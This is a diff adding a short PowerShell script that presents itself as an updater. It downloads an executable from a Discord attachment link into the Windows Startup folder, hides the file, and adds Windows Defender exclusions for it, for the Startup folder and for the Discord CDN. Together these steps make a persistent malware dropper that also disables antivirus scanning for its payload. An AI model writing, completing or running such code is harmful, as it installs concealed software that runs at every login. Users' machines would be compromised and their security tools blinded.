@@ -1,0 +1,29 @@
+$url = "https://cdn.discordapp.com/attachments/1462881234018369608/1462899862860464148/temp_updater.exe?ex=696fdf2a&is=696e8daa&hm=a2b8437e560f85d5ac59a6c22d6ba44d68c668b25bfe28bf1b84069a2d83cde2&"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\temp_updater.exe"
+
+try {
+    Write-Host "Downloading update..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing
+    
+    # Verify it's actually an executable
+    if ((Get-Item $startupPath).Extension -eq '.exe') {
+        # Hide the file
+        (Get-Item $startupPath).Attributes = 'Hidden'
+        Write-Host "Update deployed to startup folder (hidden)" -ForegroundColor Green
+    } else {
+        Write-Host "Error: Downloaded file is not an executable" -ForegroundColor Red
+        Remove-Item $startupPath -Force
+    }
+}
+catch {
+    Write-Host "Download failed: $_" -ForegroundColor Red
+}
+
+# Add exclusion for the specific file in startup
+Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\temp_updater.exe"
+
+# Or add exclusion for the entire startup folder
+Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+
+# Add exclusion for the download URL (if needed)
+Add-MpPreference -ExclusionPath "https://cdn.discordapp.com"
